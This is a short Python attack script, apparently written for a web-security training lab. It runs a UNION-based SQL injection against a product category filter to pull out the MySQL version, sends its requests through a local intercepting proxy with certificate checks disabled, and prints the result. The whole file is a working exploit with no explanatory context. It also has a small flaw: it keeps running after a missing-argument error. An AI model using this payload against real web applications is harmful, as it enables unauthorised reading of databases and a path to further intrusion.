import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
from bs4 import BeautifulSoup
import re

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def SQLi_mysql(url):
    uri = "/filter?category=Gifts"
    payload = "'+UNION+SELECT+%40%40version,+NULL+%23"
    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(text= re.compile('\S+\S+[a-z]\d+.*'))
    if version is None:
        return False
    else :
        print("[-] The version of the DataBase is " + version)
        return True




if __name__ == "__main__":
    try:
        url= sys.argv[1].strip()

    except IndexError:
        print('[-] Usage %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])

    print ("[+] Dumping Database...")
    if not SQLi_mysql(url):
        print("[-] SQLi Failed")